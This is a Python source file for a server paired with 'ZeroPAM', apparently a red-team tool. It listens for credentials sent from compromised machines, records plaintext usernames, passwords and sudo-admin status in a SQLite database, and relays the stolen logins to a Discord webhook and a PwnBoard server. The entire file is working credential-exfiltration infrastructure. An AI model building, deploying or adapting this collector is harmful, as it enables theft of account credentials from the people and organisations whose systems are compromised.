import os
import re
import time
import queue
import socket
import sqlite3
import argparse
import requests
import threading
import logging

from contextlib import closing
from typing import Optional, List
from dataclasses import dataclass
from dotenv import load_dotenv
from concurrent.futures import ThreadPoolExecutor

# Maximum concurrent client handlers to prevent file-descriptor exhaustion
MAX_CONCURRENT_CLIENTS = int(os.getenv("MAX_CONNS", "200"))

# Workers dedicated to the slow part (Discord/PwnBoard HTTP calls). Separate
# pool so a slow webhook can never block DB writes or new connections.
NOTIFY_WORKERS = int(os.getenv("NOTIFY_WORKERS", "20"))
 
# Backpressure limits: once these are full, new work is dropped (with a log
# line) instead of piling up and exhausting memory/threads.
DB_QUEUE_MAXSIZE = int(os.getenv("DB_QUEUE_MAXSIZE", "20000"))
NOTIFY_QUEUE_MAXSIZE = int(os.getenv("NOTIFY_QUEUE_MAXSIZE", "20000"))
 
# A connection should only ever be a single small recv(); keep this short so
# a slow/stalled client can't tie up a handler slot for long.
CLIENT_RECV_TIMEOUT = float(os.getenv("CLIENT_RECV_TIMEOUT", "5"))
 
ACCESS_TOKEN = os.environ.get("PWNBOARD_ACCESS_TOKEN") or None
WEBHOOK_URL = os.environ.get("WEBHOOK_URL") or None
DB_PATH = "logins.db"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)

MESSAGE_RE = re.compile(
    r"^\s*(?P<ip>\S+)\s*-\s*"
    r"(?P<message>USER AUTHENTICATED|USER CHANGED PASSWORD|SUDO SESSION OPENED)"
    r"(?:\s*:\s*(?P<username>[^:]+?)\s*:(?P<password>.*))?\s*$"
)

@dataclass
class LoginEvent:
    source_ip: str
    message: str
    username: Optional[str] = None
    password: Optional[str] = None

def parse_message(raw: str) -> Optional[LoginEvent]:
    """Strictly parse the wire protocol. Returns None for anything that
    doesn't match exactly, including stray bytes from scanners/crawlers."""
    match = MESSAGE_RE.match(raw)
    if not match:
        return None
 
    message = match.group("message")
    username = match.group("username")
    password_raw = match.group("password")
 
    username = username.strip() if username else None
 
    password: Optional[str]
    if password_raw is None:
        password = None
    else:
        password = password_raw.strip()
        if password == ":":
            # SESSION OPENED encodes "no password" as a trailing empty
            # field, e.g. "bob::" -- normalize that to an empty string.
            password = ""
 
    if message == "SUDO SESSION OPENED":
        if not username:
            return None
        password = password or ""
    elif message != "KEEP ALIVE":
        if not username or not password:
            return None
 
    return LoginEvent(
        source_ip=match.group("ip").strip(),
        message=message,
        username=username,
        password=password,
    )
 

def server_args(cmd_str):
    parser = argparse.ArgumentParser(description="Server meant for use with ZeroPAM")
    parser.add_argument('-p', '--port', metavar="<LISTENING PORT>", help="Port number to listen on (default 5000)",
                         type=int, dest="port", action="store", default=5000)
    parser.add_argument('--discord', action="store_true", help="Enable Discord Webhook (set WEBHOOK_URL env var)")
    parser.add_argument('--no-db', dest="nodb", action="store_true", help="Run the server without utilizing the database (cannot be used with --only-new)")
    parser.add_argument('--only-new', dest="onlynew", action="store_true", help="Only output new information (cannot be used with --no-db)")
    parser.add_argument('--pwnboard', dest="pwnboard", action="store_true", help="Enable cred send to PWNBoard")
    parser.add_argument('--pwnboard-host', metavar="<PWNBOARD WEBSITE>", help="Used with --pwnboard; PWNBoard website to send POST requests to (default localhost:8080)",
                         type=str, dest="pwnhost", action="store", default="localhost:8080")
    return parser.parse_args() if not cmd_str else parser.parse_args(cmd_str.split())
 
def send_pwnboard(event: LoginEvent, pwnhost: str) -> bool:
    host = f"{pwnhost}/creds"
    headers = {"Content-Type": "application/json"}
    if ACCESS_TOKEN:
        headers["Authorization"] = f"Bearer {ACCESS_TOKEN}"
 
    pwn_data = {
        "ip": event.source_ip,
        "application": "ZeroPAM",
        "username": event.username,
        "password": event.password,
    }
 
    try:
        r = requests.post(host, json=pwn_data, headers=headers, timeout=3)
        if r.status_code == 200:
            logging.info("Posted data to PWNBoard!")
            return True
        logging.warning("Unsuccessful PWNBoard POST: Code: %s, Response: %s", r.status_code, r.text)
        return False
    except requests.RequestException as e:
        logging.warning("PWNBoard POST error: %s", e)
        return False

DISCORD_BATCH_MAX = 10          # Discord allows up to 10 embeds per message
DISCORD_RETRY_LIMIT = 5         # give up on a batch after this many 429s
DISCORD_DEFAULT_RETRY_AFTER = 0.5
 
 
def _discord_embed(event: LoginEvent) -> Optional[dict]:
    if event.message == "KEEP ALIVE":
        return None
 
    fields = []
    color = 0
    if event.message in ("USER AUTHENTICATED", "USER CHANGED PASSWORD"):
        fields = [
            {"name": "Username", "value": event.username, "inline": True},
            {"name": "Password", "value": event.password, "inline": True},
        ]
        color = 0x1780e8 if event.message == "USER CHANGED PASSWORD" else 0xf5f50a
    elif event.message == "SUDO SESSION OPENED":
        fields = [{"name": "ADMIN USER", "value": event.username}]
        color = 0x07fc03
 
    return {
        "description": f"**{event.message} FROM {event.source_ip}**",
        "fields": fields,
        "color": color,
    }
 
 
def _post_discord(hook_data: dict, attempt: int = 0) -> None:
    """POST one webhook payload, honoring Discord's rate-limit response.
    204 is Discord's normal success code for webhooks (not 200)."""
    try:
        r = requests.post(WEBHOOK_URL, json=hook_data, timeout=5)
    except requests.RequestException as e:
        logging.warning("Discord webhook error: %s", e)
        return
 
    if r.status_code in (200, 204):
        return
 
    if r.status_code == 429 and attempt < DISCORD_RETRY_LIMIT:
        retry_after = DISCORD_DEFAULT_RETRY_AFTER
        try:
            retry_after = float(r.json().get("retry_after", retry_after))
        except Exception:
            pass
        time.sleep(retry_after + 0.05)
        _post_discord(hook_data, attempt + 1)
        return
 
    logging.warning("Unsuccessful Discord POST: Code: %s, Response: %s", r.status_code, r.text)
 
 
def send_discord_batch(events: "List[LoginEvent]") -> None:
    """Send up to DISCORD_BATCH_MAX events as ONE webhook message (multiple
    embeds). Batching is what actually fixes rate limiting at volume --
    it cuts the request count by up to 10x instead of retrying faster."""
    if not WEBHOOK_URL:
        return
 
    embeds = [e for e in (_discord_embed(ev) for ev in events) if e is not None]
    if not embeds:
        return
 
    hook_data = {
        "username": "ZeroPAM Bot",
        "avatar_url": "https://cdn.discordapp.com/emojis/1203535228975448094.webp",
        "embeds": embeds,
    }
    _post_discord(hook_data)
 
 
def discord_worker(discord_queue: "queue.Queue") -> None:
    """Owns the ONE Discord sender. Serializing all sends through a single
    thread (instead of a pool hammering the webhook concurrently) is what
    keeps us under Discord's per-webhook rate limit in the first place."""
    while True:
        item = discord_queue.get()
        if item is None:  # shutdown sentinel
            break
 
        batch = [item]
        while len(batch) < DISCORD_BATCH_MAX:
            try:
                batch.append(discord_queue.get_nowait())
            except queue.Empty:
                break
 
        send_discord_batch(batch)

def dispatch_notifications(event: LoginEvent, retval: int, cmd_args, notify_pool: ThreadPoolExecutor,
                            discord_queue: "queue.Queue") -> None:
    """Route webhook work off the calling thread. PwnBoard has its own
    rate limits per deployment, so it still goes to the general pool;
    Discord goes through the single serialized discord_queue instead,
    since that's what keeps it under Discord's rate limit."""
    if cmd_args.discord and (not cmd_args.onlynew or retval == 1):
        try:
            discord_queue.put_nowait(event)
        except queue.Full:
            logging.warning("Discord queue full -- dropping a notification")
 
    if cmd_args.pwnboard and cmd_args.onlynew and retval == 1:
        try:
            notify_pool.submit(send_pwnboard, event, cmd_args.pwnhost)
        except RuntimeError:
            pass  # pool is shutting down

def open_db(db_path: str = DB_PATH) -> sqlite3.Connection:
    conn = sqlite3.connect(db_path, check_same_thread=False)
    conn.execute("PRAGMA journal_mode=WAL;")
    conn.execute("PRAGMA synchronous=NORMAL;")
    conn.execute('''
        CREATE TABLE IF NOT EXISTS passwords(
            ip TEXT NOT NULL,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            known_admin INTEGER DEFAULT 0,
            PRIMARY KEY (ip, username)
        );
    ''')
    conn.commit()
    return conn
 
 
def write_db_event(conn: sqlite3.Connection, event: LoginEvent) -> int:
    """Apply one event to the (already-open) DB connection. Does NOT commit
    -- the caller controls commit batching."""
    if event.message == "KEEP ALIVE":
        return 0
 
    cur = conn.execute(
        'SELECT password, known_admin FROM passwords WHERE username = ? AND ip = ?;',
        (event.username, event.source_ip),
    )
    existing = cur.fetchone()
 
    retval = 0
    if event.message in ("USER AUTHENTICATED", "USER CHANGED PASSWORD"):
        if existing is None:
            conn.execute(
                'INSERT INTO passwords(ip, username, password) VALUES (?, ?, ?);',
                (event.source_ip, event.username, event.password),
            )
            retval = 1
        elif existing[0] != event.password:
            logging.info("Updating password for user %s...", event.username)
            conn.execute(
                'UPDATE passwords SET password = ? WHERE username = ? AND ip = ?;',
                (event.password, event.username, event.source_ip),
            )
            retval = 1
    elif event.message == "SUDO SESSION OPENED":
        if existing is not None:
            if existing[1] != 1:
                conn.execute(
                    'UPDATE passwords SET known_admin = 1 WHERE username = ? AND ip = ?;',
                    (event.username, event.source_ip),
                )
                retval = 1
        else:
            retval = -1
 
    return retval
 
 
def db_worker(db_queue: "queue.Queue", notify_pool: ThreadPoolExecutor, discord_queue: "queue.Queue", cmd_args) -> None:
    """Drains db_queue sequentially on a single persistent connection. When
    a burst has queued up, drains everything currently available before
    issuing one commit, which turns N fsyncs into 1 under load without
    adding meaningful latency when traffic is light."""
    conn = open_db()
 
    while True:
        item = db_queue.get()
        if item is None:  # shutdown sentinel
            break
 
        batch = [item]
        while True:
            try:
                batch.append(db_queue.get_nowait())
            except queue.Empty:
                break
 
        for addr, raw_line, event in batch:
            try:
                retval = write_db_event(conn, event)
            except Exception:
                logging.exception("DB write failed for event from %s", addr)
                retval = -1
 
            if cmd_args.onlynew and retval == 1:
                logging.info("Received from %s - %s", addr, raw_line.strip())
 
            dispatch_notifications(event, retval, cmd_args, notify_pool, discord_queue)
 
        try:
            conn.commit()
        except Exception:
            logging.exception("DB commit failed")

def handle_client(c, addr, cmd_args, db_queue, notify_pool, discord_queue) -> None:
    try:
        c.settimeout(CLIENT_RECV_TIMEOUT)
        raw_data = c.recv(1024)
        try:
            data = raw_data.decode()
        except UnicodeDecodeError:
            logging.debug("Non-UTF8 data from %s: %r", addr, raw_data)
            return
 
        event = parse_message(data)
        if event is None:
            # Not our protocol -- almost always a port scanner/crawler probe.
            logging.debug("Ignoring non-protocol data from %s: %r", addr, data)
            return
 
        if not cmd_args.onlynew:
            logging.info("Received from %s - %s", addr, data.strip())
 
        if cmd_args.nodb:
            # No DB means no "new info" detection, so retval is always 0.
            dispatch_notifications(event, 0, cmd_args, notify_pool, discord_queue)
            return
 
        try:
            db_queue.put_nowait((addr, data, event))
        except queue.Full:
            logging.warning("DB queue full -- dropping event from %s", addr)
 
    except socket.timeout:
        pass
    except Exception:
        logging.exception("Error handling client %s", addr)
    finally:
        try:
            c.close()
        except Exception:
            pass
 
 
def start_server(cmd_args, stop_event=None):
    db_queue = queue.Queue(maxsize=DB_QUEUE_MAXSIZE) if not cmd_args.nodb else None
    notify_pool = ThreadPoolExecutor(max_workers=NOTIFY_WORKERS, thread_name_prefix="notify")
    client_pool = ThreadPoolExecutor(max_workers=MAX_CONCURRENT_CLIENTS, thread_name_prefix="client")

    discord_queue: "queue.Queue" = queue.Queue(maxsize=NOTIFY_QUEUE_MAXSIZE)
    threading.Thread(target=discord_worker, args=(discord_queue,), daemon=True).start()
 
    if db_queue is not None:
        threading.Thread(target=db_worker, args=(db_queue, notify_pool, discord_queue, cmd_args), daemon=True).start()
 
    server_socket = socket.socket()
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    logging.info("Created socket")
 
    server_socket.bind(('', cmd_args.port))
    server_socket.listen(512)
    if stop_event is not None:
        server_socket.settimeout(1.0)
    logging.info("Server listening for incoming connections on port %s...", cmd_args.port)
 
    # Admission control: bound how many connections can be mid-handling at
    # once WITHOUT ever blocking accept() itself. If we're at capacity, the
    # connection is dropped immediately (shed load) rather than queued --
    # accept() stays responsive no matter how backed up handling gets.
    admission = threading.Semaphore(MAX_CONCURRENT_CLIENTS)
 
    def submit(client_socket, addr):
        if not admission.acquire(blocking=False):
            logging.warning("At capacity -- dropping connection from %s", addr)
            try:
                client_socket.close()
            except Exception:
                pass
            return
 
        def run():
            try:
                handle_client(client_socket, addr, cmd_args, db_queue, notify_pool, discord_queue)
            finally:
                admission.release()
 
        client_pool.submit(run)
 
    try:
        if not stop_event:
            while True:
                client_socket, addr = server_socket.accept()
                submit(client_socket, addr)
        else:
            while not stop_event.is_set():
                try:
                    client_socket, addr = server_socket.accept()
                except socket.timeout:
                    continue
                submit(client_socket, addr)
    finally:
        try:
            server_socket.close()
        except Exception:
            pass
        if db_queue is not None:
            db_queue.put(None)  # shutdown sentinel
        discord_queue.put(None)
        client_pool.shutdown(wait=False)
        notify_pool.shutdown(wait=False)

def setup(cmd_args=None, stop_event=None):
    load_dotenv()
 
    global ACCESS_TOKEN
    global WEBHOOK_URL
 
    ACCESS_TOKEN = os.environ.get("PWNBOARD_ACCESS_TOKEN") or None
    WEBHOOK_URL = os.environ.get("WEBHOOK_URL") or None
 
    if isinstance(cmd_args, str) or cmd_args is None:
        cmd_args = server_args(cmd_args)
 
        if cmd_args.discord and not WEBHOOK_URL:
            logging.error("FATAL ERROR: You must set a WEBHOOK_URL environment variable to use --discord! "
                           "Please either create a .env file with the WEBHOOK_URL or set the environment "
                           "variable globally to use this setting.")
            return False
 
        if cmd_args.nodb and cmd_args.onlynew:
            logging.error("FATAL ERROR: You cannot run no-db and only-new mode at the same time! "
                           "Database checking is required for checking if request is new!")
            return False
 
    try:
        start_server(cmd_args, stop_event)
    except KeyboardInterrupt:
        logging.info("Shutting down.")
 
 
if __name__ == '__main__':
    if not setup():
        exit(1)
 